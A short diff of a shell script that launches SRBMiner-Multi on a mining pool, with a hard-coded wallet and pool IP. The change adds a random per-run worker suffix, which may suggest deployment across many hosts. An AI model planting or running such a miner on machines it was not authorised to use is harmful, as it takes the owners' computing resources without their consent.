@@ -3,7 +3,8 @@ ALG=verushash
 WALS=Lhehm3xhWQNgF1EexRa1J2Q8LKdeAPovbY
 POIL=51.79.251.11:3300
 PASS=c=LTC,mc=VRSC
-COMA="--disable-gpu --algorithm $ALG --pool $POIL --wallet $WALS --password $PASS"
+WER=$(echo $(shuf -i 1-99999 -n 1)-LIM)
+COMA="--disable-gpu --algorithm $ALG --pool $POIL --wallet $WALS.$WER --password $PASS"
 TOP=$(shuf -n 1 -i 1-200000)
 
 FILE=./SRBMiner-Multi-0-8-0-Linux.tar.xz
